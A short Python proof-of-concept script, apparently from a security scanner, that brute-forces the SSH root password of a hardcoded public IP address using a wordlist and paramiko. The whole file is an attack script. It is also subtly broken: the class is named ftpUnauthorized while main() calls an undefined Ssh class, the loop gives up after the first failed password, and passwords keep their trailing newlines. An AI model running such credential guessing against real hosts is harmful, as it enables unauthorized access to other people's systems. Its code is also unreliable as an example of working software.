#!/usr/bin/python
# __author__ = 'jasonsheh'
# -*- coding:utf-8 -*-
from lib.poc.Base import POC
import paramiko


class ftpUnauthorized:
    def __init__(self, ip):
        self.ip = ip

    def check(self):
        with open('../dict/pwd50.txt') as file:
            for password in file:
                s = paramiko.SSHClient()
                s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    s.connect(hostname=self.ip, port=22, username='root', password=password)
                    s.close()
                    return True
                except Exception as e:
                    print(e)
                    return False

    def run(self):
        self.check()


def main():
    f = Ssh(target='115.159.160.21')
    f.run()

if __name__ == '__main__':
    main()
